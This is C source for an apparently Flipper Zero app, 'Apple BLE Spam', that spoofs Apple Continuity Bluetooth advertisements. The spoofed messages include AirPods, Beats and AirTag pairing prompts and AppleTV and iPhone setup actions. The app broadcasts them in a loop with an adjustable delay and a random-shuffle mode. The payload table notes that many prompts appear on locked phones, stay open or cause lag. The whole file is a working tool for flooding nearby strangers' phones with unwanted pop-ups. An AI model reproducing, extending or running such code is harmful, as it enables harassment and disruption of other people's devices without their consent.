#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <assets_icons.h>
#include "apple_ble_spam_icons.h"

#include "lib/continuity/continuity.h"

typedef struct {
    const char* title;
    const char* text;
    bool random;
    ContinuityMsg msg;
} Payload;

// Hacked together by @Willy-JL
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
// Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static Payload payloads[] = {
#if false
            {.title = "AirDrop",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeAirDrop,
                     .data = {.airdrop = {}},
                 }},
            {.title = "Airplay Target",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeAirplayTarget,
                     .data = {.airplay_target = {}},
                 }},
            {.title = "Handoff",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeHandoff,
                     .data = {.handoff = {}},
                 }},
            {.title = "Tethering Source",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeTetheringSource,
                     .data = {.tethering_source = {}},
                 }},
#endif
    {.title = "Random Action",
     .text = "Spam shuffle Nearby Actions",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
         }},
    {.title = "Dismiss Active Actions",
     .text = "Close current Nearby Actions",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0x00, .type = 0x00}},
         }},
    {.title = "AppleTV AutoFill",
     .text = "Banner, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
         }},
    {.title = "AppleTV Connecting...",
     .text = "Modal, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
         }},
    {.title = "Join This AppleTV?",
     .text = "Modal, unlocked, spammy",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
         }},
    {.title = "AppleTV Audio Sync",
     .text = "Banner, locked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x19}},
         }},
    {.title = "AppleTV Color Balance",
     .text = "Banner, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x1E}},
         }},
    {.title = "Setup New iPhone",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
         }},
    {.title = "Setup New Random",
     .text = "Modal, locked, glitched",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0x40, .type = 0x09}},
         }},
    {.title = "Transfer Phone Number",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
         }},
    {.title = "HomePod Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0B}},
         }},
    {.title = "Random Pair",
     .text = "Spam shuffle Proximity Pairs",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
         }},
    {.title = "AirPods Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
         }},
    {.title = "Beats Solo 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0620}},
         }},
    {.title = "AirPods Max",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0A20}},
         }},
    {.title = "Beats Flex",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1020}},
         }},
    {.title = "Airtag",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
         }},
    {.title = "Hermes Airtag",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0030}},
         }},
    {.title = "Setup New AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x01}},
         }},
    {.title = "Pair AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x06}},
         }},
    {.title = "HomeKit AppleTV Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0D}},
         }},
    {.title = "AppleID for AppleTV?",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x2B}},
         }},
    {.title = "AirPods",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
         }},
    {.title = "AirPods 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0F20}},
         }},
    {.title = "AirPods 3rd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1320}},
         }},
    {.title = "AirPods Pro 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1420}},
         }},
    {.title = "Powerbeats 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0320}},
         }},
    {.title = "Powerbeats Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0B20}},
         }},
    {.title = "Beats Solo Pro",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0C20}},
         }},
    {.title = "Beats Studio Buds",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1120}},
         }},
    {.title = "Beats X",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0520}},
         }},
    {.title = "Beats Studio 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0920}},
         }},
    {.title = "Beats Studio Pro",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1720}},
         }},
    {.title = "Beats Fit Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1220}},
         }},
    {.title = "Beats Studio Buds+",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1620}},
         }},
};

struct {
    size_t count;
    ContinuityData** datas;
} randoms[ContinuityTypeCount] = {0};

typedef struct {
    bool advertising;
    size_t delay;
    size_t size;
    uint8_t* packet;
    Payload* payload;
    FuriThread* thread;
    size_t index;
} State;

static int32_t adv_thread(void* ctx) {
    State* state = ctx;
    Payload* payload = state->payload;
    ContinuityMsg* msg = &payload->msg;
    ContinuityType type = msg->type;
    while(state->advertising) {
        if(payload->random) {
            size_t random_i = rand() % randoms[type].count;
            memcpy(&msg->data, randoms[type].datas[random_i], sizeof(msg->data));
        }
        continuity_generate_packet(msg, state->packet);
        furi_hal_bt_set_custom_adv_data(state->packet, state->size);
        furi_thread_flags_wait(true, FuriFlagWaitAny, state->delay);
    }
    return 0;
}

static void toggle_adv(State* state, Payload* payload) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        state->payload = NULL;
        furi_hal_bt_set_custom_adv_data(NULL, 0);
        free(state->packet);
        state->packet = NULL;
        state->size = 0;
    } else {
        state->size = continuity_get_packet_size(payload->msg.type);
        state->packet = malloc(state->size);
        state->payload = payload;
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const Payload* payload = &payloads[state->index];

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 3, 4, &I_apple_10px);
    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");
    canvas_set_font(canvas, FontBatteryPercent);
    char delay[14];
    snprintf(delay, sizeof(delay), "%ims", state->delay);
    canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, delay);
    canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
    canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

    canvas_set_font(canvas, FontBatteryPercent);
    canvas_draw_str(canvas, 4, 21, continuity_get_type_name(payload->msg.type));

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 4, 32, payload->title);

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 4, 46, payload->text);

    if(state->index > 0) {
        elements_button_left(canvas, "Back");
    }
    if(state->index < COUNT_OF(payloads) - 1) {
        elements_button_right(canvas, "Next");
    }
    elements_button_center(canvas, state->advertising ? "Stop" : "Start");
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam(void* p) {
    UNUSED(p);
    for(size_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
        if(payloads[payload_i].random) continue;
        randoms[payloads[payload_i].msg.type].count++;
    }
    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        if(!randoms[type].count) continue;
        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
        size_t random_i = 0;
        for(size_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
            if(payloads[payload_i].random) continue;
            if(payloads[payload_i].msg.type == type) {
                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
            }
        }
    }

    State* state = malloc(sizeof(State));
    state->delay = 500;
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 2048);

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        Payload* payload = &payloads[state->index];
        switch(input.key) {
        case InputKeyOk:
            toggle_adv(state, payload);
            break;
        case InputKeyUp:
            if(state->delay < 5000) {
                state->delay += 100;
                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
            }
            break;
        case InputKeyDown:
            if(state->delay > 100) {
                state->delay -= 100;
                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
            }
            break;
        case InputKeyLeft:
            if(state->index > 0) {
                if(state->advertising) toggle_adv(state, payload);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < COUNT_OF(payloads) - 1) {
                if(state->advertising) toggle_adv(state, payload);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(state->advertising) toggle_adv(state, payload);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    furi_thread_free(state->thread);
    free(state);

    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        free(randoms[type].datas);
    }
    return 0;
}
